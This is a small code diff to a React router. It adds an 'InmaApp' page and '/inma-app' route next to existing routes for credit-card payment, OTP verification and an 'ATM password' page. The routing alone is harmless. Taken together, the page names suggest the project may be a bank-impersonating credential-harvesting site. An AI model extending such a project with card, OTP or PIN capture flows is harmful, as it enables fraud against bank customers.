@@ -3,6 +3,7 @@ import { Toaster } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import NotFound from "@/pages/NotFound";
 import { Route, Switch } from "wouter";
+import InmaApp from "./pages/InmaApp";
 import ErrorBoundary from "./components/ErrorBoundary";
 import ScrollToTop from "./components/ScrollToTop";
 import PageTitleUpdater from "./components/PageTitleUpdater";
@@ -76,6 +77,7 @@ function Router() {
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
       <Route path={"/otp-verification"} component={OTPVerification} />
+        <Route path={"/inma-app"} component={InmaApp} />
       <Route path={"/atm-password"} component={ATMPassword} />
 
       {/* Phone Verification Routes */}
